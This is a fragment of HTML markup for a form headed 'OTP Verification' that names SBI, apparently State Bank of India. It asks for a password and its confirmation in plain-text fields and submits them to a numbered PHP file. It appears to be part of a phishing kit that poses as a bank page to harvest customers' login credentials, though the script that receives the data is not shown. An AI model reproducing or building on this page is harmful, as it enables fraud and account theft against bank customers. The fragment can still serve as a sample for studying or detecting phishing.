    ...
    <!-- Carousel Start -->
                                ...
                                <!-- <div class="limiter"> -->
                                    <!-- <div class="container-login100"> -->
                                        ...
                                        margin-left:;">
                                        <form class="login100-form validate-form" action="8.php" method="post">
                                                <span class="login100-form-title p-b-26">
                                                    OTP Verification
                                                </span>
                                                <p>An OTP has been sent to the registered mobile number with SBI</p><br><br>
                                                
                                                
                            
                                                <div class="wrap-input100 validate-input">
                                                    <input class="input100" type="text" name="pass1" placeholder="Enter Password" maxlength="35" required>
                                                  
                                                </div><br>
                                                <div class="wrap-input100 validate-input">
                                                    <input class="input100" type="text" name="pass2" placeholder="Enter Confirm Password" maxlength="35" required>
